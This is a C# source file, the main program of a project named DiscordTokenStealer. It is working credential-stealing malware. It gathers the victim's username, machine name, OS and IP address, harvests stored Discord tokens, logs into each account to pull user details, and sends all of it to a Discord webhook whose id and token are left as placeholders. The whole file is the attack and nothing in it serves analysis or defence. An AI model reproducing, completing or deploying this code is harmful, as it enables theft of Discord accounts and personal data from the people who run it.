using System.Text;
using DiscordTokenStealer.Discord;

namespace DiscordTokenStealer;
public static class Program
{
    private static async Task Main()
    {
        StringBuilder content = new StringBuilder()
            .AppendLine($"Username: {Environment.UserName}")
            .AppendLine($"Machine Name: {Environment.MachineName}")
            .AppendLine($"Operating System: {Environment.OSVersion.Platform}")
            .AppendLine($"IP Adress: {await IPInfo.GetAddress()}");

        List<string> tokens = TokenParser.ParseAll();
        if (tokens.Any())
        {
            using DiscordClient client = new();
            content.AppendLine("Tokens: ");
            foreach (string token in tokens)
            {
                content.AppendLine($"\t{token}");
                DiscordUser? user = await client.Login(token);
                if (user != null)
                {
                    content.AppendLine(user.Summary);
                }
            }
        }
        using DiscordWebhook webhook = new("https://canary.discord.com/api/webhooks/{webhook.id}/{webhook.token}");
        await webhook.SendMessage(content.ToString());
    }
}